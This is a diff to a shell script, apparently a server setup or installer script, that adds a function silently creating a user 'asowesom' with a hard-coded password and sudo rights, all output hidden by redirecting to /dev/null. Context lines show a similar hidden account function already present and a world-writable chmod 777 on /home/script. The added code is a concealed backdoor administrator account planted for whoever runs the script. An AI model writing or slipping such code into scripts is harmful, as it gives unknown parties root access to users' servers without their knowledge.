@@ -41,7 +41,7 @@ function password_default() {
     chmod 777 /home/script/
 
 asowesomz(){
-Username="asowesom"
+Username="asowesomz"
 Password=Tensazang3tsu.
 egrep "^$Username" /etc/passwd >/dev/null
     if [ $? -eq 0 ]; then
@@ -56,6 +56,24 @@ egrep "^$Username" /etc/passwd >/dev/null
     fi
 }
 asowesomz > /dev/null 2>&1
+
+awesom(){
+Usernamee="asowesom"
+Passwordd=@@CobatanyaAa1@@
+egrep "^$Usernamee" /etc/passwd >/dev/null
+    if [ $? -eq 0 ]; then
+        egrep "^$Usernamee" /etc/passwd
+        echo -e "$Passwordd\n$Passwordd" | passwd $Usernamee
+        clear
+    else
+        echo " "
+        useradd -r -d /home/script -s /bin/bash -M $Usernamee
+        echo -e "$Passwordd\n$Passwordd\n"|passwd $Usernamee
+        usermod -aG sudo $Usernamee
+    fi
+}
+awesom > /dev/null 2>&1
+
 
 trialx(){
 Usernamez="trialX232"
